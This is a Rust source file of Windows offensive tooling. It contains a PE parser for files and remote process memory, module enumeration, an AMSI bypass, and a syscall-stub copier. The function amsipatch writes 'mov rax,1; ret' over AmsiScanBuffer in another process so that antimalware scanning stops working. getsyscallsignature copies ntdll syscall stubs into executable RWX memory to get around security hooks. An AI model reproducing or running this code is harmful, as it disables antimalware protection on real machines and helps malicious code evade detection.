#![allow(dead_code)]

use std::collections::HashMap;
use std::string;
use std::{fs::File, io::Read};

use ntapi::ntapi_base::{CLIENT_ID, PCLIENT_ID};
use ntapi::ntldr::LDR_DATA_TABLE_ENTRY;
use ntapi::ntobapi::NtQueryObject;
use ntapi::ntobapi::OBJECT_INFORMATION_CLASS;
use ntapi::ntobapi::OBJECT_TYPE_INFORMATION;
use ntapi::ntpsapi::{PROCESSINFOCLASS, NtQueryInformationProcess, PROCESS_BASIC_INFORMATION, PEB_LDR_DATA};
use winapi::ctypes::*;
use winapi::shared::ntdef::{NTSTATUS, NT_SUCCESS, OBJECT_ATTRIBUTES, POBJECT_ATTRIBUTES};
use winapi::shared::ntdef::UNICODE_STRING;
use winapi::shared::ntstatus::STATUS_INFO_LENGTH_MISMATCH;
use winapi::shared::ntstatus::STATUS_SUCCESS;
use winapi::shared::sddl::*;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::ReadFile;
use winapi::um::handleapi::{CloseHandle, SetHandleInformation};
use winapi::um::handleapi::DuplicateHandle;
use winapi::um::handleapi::INVALID_HANDLE_VALUE;
use winapi::um::lsalookup::LSA_UNICODE_STRING;
use winapi::um::memoryapi::ReadProcessMemory;
use winapi::um::memoryapi::*;
use winapi::um::minwinbase::SECURITY_ATTRIBUTES;
use winapi::um::ntlsa::SECURITY_LOGON_SESSION_DATA;
use winapi::um::ntsecapi::*;
use winapi::um::processthreadsapi::*;
use winapi::um::securitybaseapi::*;
use winapi::um::winbase::*;
use winapi::um::winnt::*;
use winapi::um::winnt::{TOKEN_INFORMATION_CLASS, TOKEN_USER};
use winapi::um::ntlsa::*;
use ntapi::ntexapi::*;
use winapi::um::synchapi::*;
use winapi::um::tlhelp32::*;
use winapi::shared::winerror::*;
use itertools::Itertools;
use winapi::um::memoryapi::*;
use ntapi::ntpebteb::*;

use winapi::um::timezoneapi::*;
use winapi::shared::minwindef::*;

pub struct peparser{
    pub filecontents: Vec<u8>,
    pub memorycontents:Vec<u8>
}


// associated functions
impl peparser{

    pub fn parsefromfile(filepath:&str) -> Result<peparser, String>{
        let res = File::open(filepath);
        if res.is_err(){
            return Err(res.err().unwrap().to_string());
        }
        let mut buffer = vec![0u8;4096000];
        let res2 = res.unwrap().read(&mut buffer);
        if res2.is_err(){
            return Err(res2.err().unwrap().to_string());
        }
        // checking if its pe file or not
        if buffer[0]!=0x4d && buffer[1]!=0x5a{
            
            return Err("Not a valid PE file".to_string());
        }

        return Ok(peparser{filecontents:buffer,memorycontents:Vec::new()});

    }


    pub fn parsefrommemory(prochandle:*mut c_void,baseaddress:*const c_void)
    -> Result<peparser,String>{

        // checking if memory points to pe file or not
        let dosheader = RemoteParse::<IMAGE_DOS_HEADER>(prochandle, baseaddress);
        if dosheader.is_err(){
            return Err(dosheader.err().unwrap().to_string());
        }

        let dosheader = dosheader.unwrap();
        if dosheader.e_magic!=0x5a4d{
            return Err(format!("Not a valid pe file"));
        }


        let ntheader = RemoteParse::<IMAGE_NT_HEADERS64>(prochandle, (baseaddress as usize + dosheader.e_lfanew as usize) as *const c_void);
        if ntheader.is_err(){
            return Err(ntheader.err().unwrap().to_string());
        }
        let ntheader = ntheader.unwrap();
        //println!("machine: {:x?}",ntheader.FileHeader.Machine);
        if ntheader.FileHeader.Machine!=0x8664{
            return Err("can only parse 64bit".to_string());
        }

        let mut buffer = vec![0;ntheader.OptionalHeader.SizeOfImage as usize];
        unsafe{
            let mut bytesread = 0;
            let res = ReadProcessMemory(prochandle, baseaddress, 
            buffer.as_mut_ptr() as *mut c_void, 
            buffer.len(), &mut bytesread);
        
            if res==0{
                return Err(format!("readprocessmemory failed: {}",GetLastError()));
            }

        }

        return Ok(peparser{filecontents:Vec::new(),memorycontents:buffer});

    }


}



impl peparser{

    pub fn getdosheader(&self) -> IMAGE_DOS_HEADER{
        if self.filecontents.len()>1{
            unsafe{
                let dosheader = RemoteParse::<IMAGE_DOS_HEADER>(GetCurrentProcess(), self.filecontents.as_ptr() as *const c_void);
                return dosheader.unwrap();
            }
        }
        else if self.memorycontents.len()>1{
            unsafe{
                let dosheader = RemoteParse::<IMAGE_DOS_HEADER>(GetCurrentProcess(), self.memorycontents.as_ptr() as *const c_void);
                return dosheader.unwrap();
            }
        }
        else{
            return unsafe{std::mem::zeroed::<IMAGE_DOS_HEADER>()};
        }

    }

    pub fn getntheader(&self) -> IMAGE_NT_HEADERS64{
        if self.filecontents.len()>1{
            unsafe{
                let dosheader = self.getdosheader();
                return RemoteParse::<IMAGE_NT_HEADERS64>(GetCurrentProcess(), (self.filecontents.as_ptr() as usize + dosheader.e_lfanew as usize) as *const c_void).unwrap();
            }
        }

        else if self.memorycontents.len()>1{
            unsafe{
                let dosheader = self.getdosheader();
                return RemoteParse::<IMAGE_NT_HEADERS64>(GetCurrentProcess(), (self.memorycontents.as_ptr() as usize + dosheader.e_lfanew as usize) as *const c_void).unwrap();
            }
        }
        else{
            return unsafe{std::mem::zeroed::<IMAGE_NT_HEADERS64>()};
        }

    }


    pub fn getsectionheaders(&self) -> Vec<IMAGE_SECTION_HEADER> {
        if self.filecontents.len()>1{
            unsafe{
                let dosheader = self.getdosheader();
                let ntheader = self.getntheader();
                let mut sections:Vec<IMAGE_SECTION_HEADER> = Vec::new();
                let mut baseaddress = self.filecontents.as_ptr() as *const c_void;
                for i in 0..ntheader.FileHeader.NumberOfSections{
                    let section = RemoteParse::<IMAGE_SECTION_HEADER>(GetCurrentProcess(), (baseaddress as usize + dosheader.e_lfanew as usize + 
                        std::mem::size_of_val(&ntheader) as usize + 
                        (i as usize * std::mem::size_of::<IMAGE_SECTION_HEADER>())) as *const c_void);
                    sections.push(section.unwrap());
                }
                return sections;
            }
        }
        else {
            unsafe{
                let dosheader = self.getdosheader();
                let ntheader = self.getntheader();
                let mut sections:Vec<IMAGE_SECTION_HEADER> = Vec::new();
                let mut baseaddress = self.memorycontents.as_ptr() as *const c_void;
                for i in 0..ntheader.FileHeader.NumberOfSections{
                    let section = RemoteParse::<IMAGE_SECTION_HEADER>(GetCurrentProcess(), (baseaddress as usize + dosheader.e_lfanew as usize + 
                        std::mem::size_of_val(&ntheader) as usize + 
                        (i as usize * std::mem::size_of::<IMAGE_SECTION_HEADER>())) as *const c_void);
                    sections.push(section.unwrap());
                }
                return sections;
            }
        }
    }


    pub fn rvatofileoffset(&self,rva:usize) -> Result<usize,String>{
        let sections = self.getsectionheaders();
        for i in 0..sections.len(){
            if rva>=sections[i].VirtualAddress as usize && (rva<=(sections[i].VirtualAddress as usize+unsafe{*sections[i].Misc.VirtualSize()} as usize)){
                let mut fileoffset = rva - sections[i].VirtualAddress as usize;
                 fileoffset += sections[i].PointerToRawData as usize;
                 return Ok(fileoffset);
            }
        }
        return Err("rva not found in sections".to_string());
    }


    pub fn getimports(&self) -> Result<Vec<HashMap<String,HashMap<String,Vec<usize>>>>, String>{
        
        if self.filecontents.len()>0{
            let mut imports:Vec<HashMap<String,HashMap<String,Vec<usize>>>> = Vec::new();
            

            let ntheader = self.getntheader();
            if ntheader.OptionalHeader.DataDirectory[1].Size==0{
                return Err("no imports".to_string());
            }
           
            let mut firstimportaddress = self.filecontents.as_ptr() as usize + (self.rvatofileoffset(ntheader.OptionalHeader.DataDirectory[1].VirtualAddress as usize).unwrap());
            
            let mut dlls:HashMap<String,HashMap<String,Vec<usize>>> = HashMap::new();
           

            loop{
                
                let firstimport= unsafe{RemoteParse::<IMAGE_IMPORT_DESCRIPTOR>(GetCurrentProcess(), firstimportaddress as *const c_void)}.unwrap();

                if firstimport.Name == 0{
                    break;
                }
                
                let dllname = unsafe{
                    ReadStringFromMemory(GetCurrentProcess(),
                    (self.filecontents.as_ptr() as usize +
                     self.rvatofileoffset(firstimport.Name as usize).unwrap() as usize)
                     as *const c_void
                    )};
                
                
                let mut firstoft = self.filecontents.as_ptr() as usize + unsafe{self.rvatofileoffset(*firstimport.u.OriginalFirstThunk() as usize)}.unwrap();
                let mut firstft = self.filecontents.as_ptr() as usize + unsafe{self.rvatofileoffset(firstimport.FirstThunk as usize)}.unwrap();
                let mut firstftptr = firstimport.FirstThunk as usize;

                let mut funcs:HashMap<String,Vec<usize>> = HashMap::new();
            

                'funloop: loop{
                   
                    let mut thunks:Vec<usize> = Vec::new();
                    let mut oftbuffer = vec![0u8;8];
                    let mut bytesread = 0;
                    unsafe{
                        ReadProcessMemory(GetCurrentProcess(), 
                        firstoft as *mut c_void,
                        oftbuffer.as_mut_ptr() as *mut c_void ,
                        8 , 
                        &mut bytesread);
                    }
                    let importbyname = u64::from_ne_bytes(oftbuffer.try_into().unwrap());
                    //let importbyname = unsafe{RemoteParse::<IMAGE_IMPORT_BY_NAME>(GetCurrentProcess(), firstoft as *const c_void)}.unwrap();
                    
                    if importbyname == 0{
                        break 'funloop;
                    }


                    // reading firstthunk
                    let mut ftbuffer = vec![0u8;8];
                    let mut bytesread = 0;
                    unsafe{
                        ReadProcessMemory(GetCurrentProcess(), 
                        firstft as *mut c_void,
                        ftbuffer.as_mut_ptr() as *mut c_void ,
                        8 , 
                        &mut bytesread);
                    }



                    thunks.push(firstftptr as usize);
                    thunks.push(u64::from_ne_bytes(ftbuffer.try_into().unwrap()) as usize);

                    let funcaddress = unsafe { self.filecontents.as_ptr() as usize + 2 + self.rvatofileoffset(importbyname as usize).unwrap() };
                    let functionname = unsafe{
                        ReadStringFromMemory(GetCurrentProcess(), funcaddress as *const c_void)
                    };
                   

                    funcs.insert(functionname, thunks);

                    firstoft += 8 as usize;
                    firstft += 8 as usize;
                    firstftptr += 8;
                }
                
                dlls.insert(dllname, funcs);

                firstimportaddress += std::mem::size_of::<IMAGE_IMPORT_DESCRIPTOR>();
                println!();
            }
            

            imports.push(dlls);
            return Ok(imports);
        }


        else if self.memorycontents.len()>0{
            let mut imports:Vec<HashMap<String,HashMap<String,Vec<usize>>>> = Vec::new();
            

            let ntheader = self.getntheader();
            if ntheader.OptionalHeader.DataDirectory[1].Size==0{
                return Err("no imports".to_string());
            }
           
            let mut firstimportaddress = self.memorycontents.as_ptr() as usize + (ntheader.OptionalHeader.DataDirectory[1].VirtualAddress as usize);
            
            let mut dlls:HashMap<String,HashMap<String,Vec<usize>>> = HashMap::new();
           

            loop{
                
                let firstimport= unsafe{RemoteParse::<IMAGE_IMPORT_DESCRIPTOR>(GetCurrentProcess(), firstimportaddress as *const c_void)}.unwrap();

                if firstimport.Name == 0{
                    break;
                }
                
                let dllname = unsafe{
                    ReadStringFromMemory(GetCurrentProcess(),
                    (self.memorycontents.as_ptr() as usize +
                     firstimport.Name  as usize)
                     as *const c_void
                    )};
                
                
                let mut firstoft = self.memorycontents.as_ptr() as usize + unsafe{*firstimport.u.OriginalFirstThunk() as usize};
                let mut firstft = self.memorycontents.as_ptr() as usize + firstimport.FirstThunk as usize;
                
                let mut firstftptr = firstimport.FirstThunk as usize;

                let mut funcs:HashMap<String,Vec<usize>> = HashMap::new();
            

                'funloop: loop{
                   
                    let mut thunks:Vec<usize> = Vec::new();
                    let mut oftbuffer = vec![0u8;8];
                    let mut bytesread = 0;
                    unsafe{
                        ReadProcessMemory(GetCurrentProcess(), 
                        firstoft as *mut c_void,
                        oftbuffer.as_mut_ptr() as *mut c_void ,
                        8 , 
                        &mut bytesread);
                    }
                    let importbyname = u64::from_ne_bytes(oftbuffer.try_into().unwrap());
                    //let importbyname = unsafe{RemoteParse::<IMAGE_IMPORT_BY_NAME>(GetCurrentProcess(), firstoft as *const c_void)}.unwrap();
                    
                    if importbyname == 0{
                        break 'funloop;
                    }


                    // reading firstthunk
                    let mut ftbuffer = vec![0u8;8];
                    let mut bytesread = 0;
                    unsafe{
                        ReadProcessMemory(GetCurrentProcess(), 
                        firstft as *mut c_void,
                        ftbuffer.as_mut_ptr() as *mut c_void ,
                        8 , 
                        &mut bytesread);
                    }



                    thunks.push(firstftptr );
                    thunks.push(u64::from_ne_bytes(ftbuffer.try_into().unwrap()) as usize);

                    let funcaddress = unsafe { self.memorycontents.as_ptr() as usize + 2 + importbyname as usize };
                    let functionname = unsafe{
                        ReadStringFromMemory(GetCurrentProcess(), funcaddress as *const c_void)
                    };
                   

                    funcs.insert(functionname, thunks);

                    firstoft += 8 as usize;
                    firstft += 8 as usize;
                    firstftptr += 8;
                }
                
                dlls.insert(dllname, funcs);

                firstimportaddress += std::mem::size_of::<IMAGE_IMPORT_DESCRIPTOR>();
                println!();
            }
            

            imports.push(dlls);
            return Ok(imports);
        }


        return Ok(Vec::new());
    }


    pub fn getexports(&self) -> Result<HashMap<String,usize>,String>{
       unsafe{

            if self.filecontents.len()>1{
                
                let ntheader = self.getntheader();
                if ntheader.OptionalHeader.DataDirectory[0].Size==0{
                    return Err(format!("no exports are present"));
                }

                let mut functions:HashMap<String,usize> =HashMap::new();
                let exportdirectory = *((self.filecontents.as_ptr() as usize +  self.rvatofileoffset(ntheader.OptionalHeader.DataDirectory[0].VirtualAddress as usize).unwrap()) as *mut IMAGE_EXPORT_DIRECTORY);


                let eatptr = self.filecontents.as_ptr() as usize + (self.rvatofileoffset(exportdirectory.AddressOfFunctions as usize).unwrap());
                let entptr = self.filecontents.as_ptr() as usize + (self.rvatofileoffset(exportdirectory.AddressOfNames as usize).unwrap());
                let eotptr = self.filecontents.as_ptr() as usize + (self.rvatofileoffset(exportdirectory.AddressOfNameOrdinals as usize).unwrap());

                for i in 0..exportdirectory.NumberOfNames{


                   let funcnameoffset= std::ptr::read((entptr + (i as usize * 4)) as *const u32);
                   let functionname = ReadStringFromMemory(GetCurrentProcess(), (self.filecontents.as_ptr() as usize + funcnameoffset as usize) as *const c_void);

                    let ordinaloffset = std::ptr::read((eotptr as usize + (i as usize *2)) as *const u16);

                    let addressoffset = std::ptr::read((eatptr as usize + (ordinaloffset as usize * 4)) as *const u32);

                     
                    functions.insert(functionname, addressoffset as usize);
                }


                return Ok(functions);
            }


            else if self.memorycontents.len()>1{
                let ntheader = self.getntheader();
                if ntheader.OptionalHeader.DataDirectory[0].Size==0{
                    return Err(format!("no exports are present"));
                }

                let mut functions:HashMap<String,usize> =HashMap::new();
                let exportdirectory = *((self.memorycontents.as_ptr() as usize +  ntheader.OptionalHeader.DataDirectory[0].VirtualAddress as usize) as *mut IMAGE_EXPORT_DIRECTORY);


                let eatptr = self.memorycontents.as_ptr() as usize + exportdirectory.AddressOfFunctions as usize;
                let entptr = self.memorycontents.as_ptr() as usize + exportdirectory.AddressOfNames as usize;
                let eotptr = self.memorycontents.as_ptr() as usize + exportdirectory.AddressOfNameOrdinals as usize;

                for i in 0..exportdirectory.NumberOfNames{


                   let funcnameoffset= std::ptr::read((entptr + (i as usize * 4)) as *const u32);
                   let functionname = ReadStringFromMemory(GetCurrentProcess(), (self.memorycontents.as_ptr() as usize + funcnameoffset as usize) as *const c_void);

                    let ordinaloffset = std::ptr::read((eotptr as usize + (i as usize *2)) as *const u16);

                    let addressoffset = std::ptr::read((eatptr as usize + (ordinaloffset as usize * 4)) as *const u32);

                     
                    functions.insert(functionname, addressoffset as usize);
                }


                return Ok(functions);

            }


            return Ok(HashMap::new());

       }
    }


    pub fn getbaserelocations(&self) {
        unsafe{

            if self.filecontents.len()>1{
                let ntheader = self.getntheader();
                if ntheader.OptionalHeader.DataDirectory[5].Size==0{
                    return ();
                }
                let mut baserelocptr = self.filecontents.as_ptr() as usize + self.rvatofileoffset(ntheader.OptionalHeader.DataDirectory[5].VirtualAddress as usize).unwrap();
                
                loop{
                    let basereloc = RemoteParse::<IMAGE_BASE_RELOCATION>(GetCurrentProcess(), baserelocptr as *const c_void).unwrap();
                    if basereloc.SizeOfBlock == 0{
                        break;
                    }

                    let entriescount = (basereloc.SizeOfBlock - 8) /  2;
                    

                    for i in 0..entriescount{
                        let valueoffset = std::ptr::read(((baserelocptr as usize + 8) + (i as usize * 2)) as *const u16);
                        println!("pagerva: {:x?}, offset to relocate: {:x?}",
                        basereloc.VirtualAddress,valueoffset);
                    }

                    baserelocptr += basereloc.SizeOfBlock as usize;

                }
                

               

            }

        }
    }


}



pub fn amsipatch(pid: usize) -> Result<String,String>{
    unsafe{


        let prochandle = OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, 0, pid as u32);
        if prochandle.is_null(){
            return Err(format!("[+] OpenProcess failed: {}",GetLastError()));
        }
        println!("[+] Opened process");
        //println!("[+] Checking if amsi.dll is loaded or not");

        let loadeddlls = getloadeddlls(pid as u32);
        for (k,v) in &loadeddlls{
            if *k == "amsi.dll"{
                println!("[+] amsi.dll found in the {} process at address: {:x?}",pid,*v);
                let res = peparser::parsefrommemory(prochandle, *v as *const c_void);
                if res.is_err(){
                    CloseHandle(prochandle);
                    return Err(format!("{}",res.err().unwrap()));
                }
                let pe = res.unwrap();
                let res = pe.getexports();
                if res.is_err(){
                    CloseHandle(prochandle);
                    return Err(format!("{}",res.err().unwrap()));
                }
                let exports = res.unwrap();
                for (funcname,funcaddress) in &exports{
                    if *funcname=="AmsiScanBuffer"{
                        println!("[+] found AmsiScanBuffer at {:x?}",funcaddress);
                        println!("[+] Trying to patch");
                        
                        let patch:[u8;8] = [0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00, 0xC3 ];
                        let mut byteswritten = 0;
                        let mut oldprotect = 0;
                        let res = VirtualProtectEx(prochandle, 
                            (*v as usize + *funcaddress) as *mut c_void, 
                            5, 0x40, &mut oldprotect);
                        if res==0{
                            CloseHandle(prochandle);
                            return Err(format!("[+] changing memory protection failed: {}",GetLastError()));
                        }
                        let res =  WriteProcessMemory(prochandle, 
                                (*v as usize + *funcaddress) as *mut c_void, 
                                patch.as_ptr() as *const c_void, 
                                8, &mut byteswritten);
                        VirtualProtectEx(prochandle, 
                                    (*v as usize + *funcaddress) as *mut c_void, 
                                    5, oldprotect, &mut oldprotect);
                        if res==0{
                            CloseHandle(prochandle);
                            return Err(format!("writeprocessmemory failed: {}",GetLastError()));
                            
                        }
                        CloseHandle(prochandle);
                        return Ok("tried to patch amsi successfully".to_string());

                    }
                }


            }
        }

        return Err(format!("something went wrong"));

    }
}


pub fn LargeIntegerToSystemTime(li: &LARGE_INTEGER)
-> Result<String, String>{
    unsafe{
        use winapi::um::minwinbase::*;
        let mut st = std::mem::zeroed::<SYSTEMTIME>();
        let res = FileTimeToSystemTime(li as *const _ as *const FILETIME, &mut st);
        if res==0{
            return Err(format!("FileTimeToSystemTime failed: {}",GetLastError()));
        }

        return Ok(format!("day/month/year: {}/{}/{}, hr/min/sec: {}:{}:{}",
                st.wDay,st.wMonth,st.wYear,st.wHour,st.wMinute,st.wSecond));

    }
}


pub fn getsyscallsignature(funcname:String) -> *mut c_void{
    unsafe{

        let dlls =  getloadeddlls(GetCurrentProcessId());

        

        for (k,v) in &dlls{
            if *k=="ntdll.dll"{
                let pe = peparser::parsefrommemory(GetCurrentProcess(), *v as *const c_void);
                if pe.is_ok(){
                    let ourpe = pe.unwrap();
                    let exports = ourpe.getexports();

                    if exports.is_ok(){
                        let funcs = exports.ok().unwrap();

                        for (k1,v1) in &funcs{
                            if *k1==funcname{

                              

                                let mut ogbuffer=vec![0u8;50];
                                let mut bytesread = 0;
                                ReadProcessMemory(GetCurrentProcess(), 
                                (*v as usize + *v1 as usize) as *const c_void, 
                                ogbuffer.as_mut_ptr() as *mut c_void, 
                                50, &mut bytesread);

                                // taking only bytes upto 0x0f 0x05 0xc3
                                // syscall ret
                                println!("ogbuffer: {:x?}",ogbuffer);
                                let mut dupbuffer:Vec<u8> =Vec::new();
                                for i in 0..ogbuffer.len(){
                                    if ogbuffer.len()-i<3{
                                        break;
                                    }
                                    if ogbuffer[i]==0x0f&&ogbuffer[i+1]==0x05&&ogbuffer[i+2]==0xc3{
                                        dupbuffer = ogbuffer[0..i+3].to_vec();
                                    }
                                }

                                if dupbuffer.len()==0{
                                    return 0 as *mut c_void;
                                }

                               
                                let mut buffer = VirtualAlloc(std::ptr::null_mut(), dupbuffer.len(), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);


                                let mut bytesread = 0;
                                WriteProcessMemory(GetCurrentProcess(), 
                                buffer, 
                                dupbuffer.as_ptr() as *const c_void, 
                                dupbuffer.len(), 
                                &mut bytesread);
                                

                               // VirtualProtect((buffer.as_mut_ptr()) as *mut c_void, 
                                //21, PAGE_EXECUTE_READWRITE, std::ptr::null_mut());
                                return buffer as *mut c_void;
                                
                            }   

                        }


                    }
                }
                
            }
        }

    }
    return 0 as *mut c_void;
}

pub fn getloadeddlls(pid: u32) -> HashMap<String,usize>{
    unsafe{

        let mut dlls:HashMap<String,usize> = HashMap::new();

        let snaphandle =CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
        if snaphandle == INVALID_HANDLE_VALUE{
            println!("createtoolhelp32snapshot error: {}",GetLastError());
            CloseHandle(snaphandle);
            return HashMap::new();
        }

        let mut modentry = std::mem::zeroed::<MODULEENTRY32>();
        modentry.dwSize = std::mem::size_of::<MODULEENTRY32>() as u32;
        let mut res = Module32First(snaphandle,&mut modentry );

        if res==0{
            println!("module32first error: {}",GetLastError());
            CloseHandle(snaphandle);
            return HashMap::new();
        }

        let dllbase = modentry.modBaseAddr;
       
        let mut buffer= modentry.szModule.iter().map(|&c| c as u8).collect::<Vec<u8>>();
        let dllname = String::from_utf8_lossy(&buffer).to_string();

       
        dlls.insert(dllname.trim_end_matches("\0").to_string(), dllbase as usize);

        
        
        loop{
            
            let mut modentry = std::mem::zeroed::<MODULEENTRY32>();
            modentry.dwSize = std::mem::size_of::<MODULEENTRY32>() as u32;
            res = Module32Next(snaphandle, &mut modentry);
        
            if res==0|| GetLastError()==ERROR_NO_MORE_FILES{
                break;
            }

            let dllbase = modentry.modBaseAddr;
       
            let  buffer= modentry.szModule.iter().map(|&c| c as u8).collect::<Vec<u8>>();
            let dllname = String::from_utf8_lossy(&buffer).to_string();
    
            dlls.insert(dllname.trim_end_matches("\0").to_string(), dllbase as usize);



            
        }


        CloseHandle(snaphandle);
        return dlls;

    }
}



pub fn RemoteParse<T>(prochandle:*mut c_void, baseaddress:*const c_void)
 -> Result<T, String> where T:Copy,{
    unsafe{
        
        let ssize = std::mem::size_of::<T>();
        let mut buffer = vec![0u8;ssize];
        let mut bytesread = 0;
        let res = ReadProcessMemory(prochandle, baseaddress,
             buffer.as_mut_ptr() as *mut c_void, 
             buffer.len(), 
            &mut bytesread);
        if res==0{
            return Err(format!("readprocessmemory failed: {}",GetLastError()));
        }

        return Ok(*(buffer.as_mut_ptr() as *mut T));
    }
}



pub fn getloadedmodules(prochandle: *mut c_void) -> HashMap<String,usize>{
    unsafe{
        let mut modules: HashMap<String,usize> = HashMap::new();
        let mut bytesneeded = 0 as u32;
        let ntstatus = NtQueryInformationProcess(prochandle, 
            0, 
            std::ptr::null_mut(), 
            std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
             &mut bytesneeded);

        println!("ntstatus : {:x?}",ntstatus);
        println!("bytesneeded: {}",bytesneeded);
            
        let mut buffer = vec![0u8;bytesneeded as usize];
        let ntstatus = NtQueryInformationProcess(prochandle, 
            0, 
            buffer.as_mut_ptr() as *mut c_void, 
            std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
             &mut bytesneeded);

        if !NT_SUCCESS(ntstatus){
            println!("ntqueryinformation process error: {:x?}",ntstatus);
            return HashMap::new();
        }

        let pbi = *(buffer.as_mut_ptr() as *mut PROCESS_BASIC_INFORMATION);
        let peb = RemoteParse::<PEB>(prochandle, pbi.PebBaseAddress as *const c_void).unwrap();
        let ldrdata = RemoteParse::<PEB_LDR_DATA>(prochandle, peb.Ldr as *const c_void).unwrap();
    
        let firstentry = ldrdata.InLoadOrderModuleList.Flink;

        let table1 = RemoteParse::<LDR_DATA_TABLE_ENTRY>(prochandle, firstentry as *const c_void).unwrap();
        
        let mut nexttable = table1.clone();
        //println!("{:x?}",firstentry);
        let dllname = unicodetostring(&table1.BaseDllName, prochandle);
        let dllbaseaddress = table1.DllBase;
        modules.insert(dllname.trim_end_matches("\0").to_string(), dllbaseaddress as usize);
       


        loop{

            if nexttable.InLoadOrderLinks.Flink == firstentry{
                break;
            }
            
            nexttable = RemoteParse::<LDR_DATA_TABLE_ENTRY>(prochandle, nexttable.InLoadOrderLinks.Flink as *const c_void).unwrap();
            let dllname = unicodetostring(&nexttable.BaseDllName, prochandle);
            let dllbaseaddress = nexttable.DllBase;
            modules.insert(dllname.trim_end_matches("\0").to_string(), dllbaseaddress as usize);
       
            
        
        }

        return modules;

    }
}



pub fn unicodetostring(lus: &UNICODE_STRING,prochandle: *mut c_void)
  -> String{
    unsafe{

        let mut buffer:Vec<u16> = vec![0;lus.MaximumLength as usize];
        let mut bytesread = 0;
        //std::ptr::copy(lus.Buffer, buffer.as_mut_ptr() as *mut u16, 
         //   (lus.Length/2) as usize);
        
        let res = ReadProcessMemory(prochandle, 
            lus.Buffer as *const c_void, 
            buffer.as_mut_ptr() as *mut c_void, 
            (lus.Length) as usize, 
            &mut bytesread);

        if bytesread==0{
            return format!("reading process memory failed: {}",GetLastError());
        }

        return String::from_utf16_lossy(&buffer);



    }
}


pub fn getprocessbaseaddress(prochandle: *mut c_void) -> usize{
    unsafe{
        let mut bytesneeded = 1024 as u32;
        let mut buffer = loop{

            let mut buffer2 = vec![0u8;bytesneeded as usize];
            let ntstatus = NtQueryInformationProcess(prochandle, 
                0, 
                buffer2.as_mut_ptr() as *mut c_void, 
                std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
                 &mut bytesneeded);
            if NT_SUCCESS(ntstatus){
                break buffer2;
            }
        };

        

        let pbi = *(buffer.as_mut_ptr() as *mut PROCESS_BASIC_INFORMATION);
        let peb = RemoteParse::<PEB>(prochandle, pbi.PebBaseAddress as *const c_void).unwrap();
        return peb.ImageBaseAddress as usize;
        
    }
}


pub fn ReadStringFromMemory(prochandle: *mut c_void, base: *const c_void) -> String {
    unsafe {
        let mut i: isize = 0;
        let mut s = String::new();
        loop {
            let mut a: [u8; 1] = [0];
            ReadProcessMemory(
                prochandle,
                (base as isize + i) as *const c_void,
                a.as_mut_ptr() as *mut c_void,
                1,
                std::ptr::null_mut(),
            );

            if a[0] == 0 || i == 50 {
                return s;
            }
            s.push(a[0] as char);
            i += 1;
        }
    }
}